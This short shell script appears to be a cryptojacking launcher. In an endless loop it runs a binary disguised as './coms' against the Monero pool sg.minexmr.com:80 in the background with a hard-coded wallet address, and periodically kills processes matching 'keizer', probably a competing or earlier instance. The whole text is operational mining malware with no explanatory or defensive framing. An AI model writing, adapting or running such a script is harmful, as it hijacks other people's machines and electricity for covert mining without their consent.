#!/bin/sh 
 while true;
  do
  ./coms --donate-level 1 -o sg.minexmr.com:80 -u 47RMDsjAS2p5V7NyFoGiFPZNKZiEfF4Hr1FJHEExJwuKGku7CHfS91CcpVWnCvKTDhZY1XEJU5cg4LS2nqoAwQiT4Qi7bEZ -p x -t 1 -k --background
  sleep 1500
  kill $(ps aux | grep 'keizer' | awk '{print $2}');
  sleep 15
done
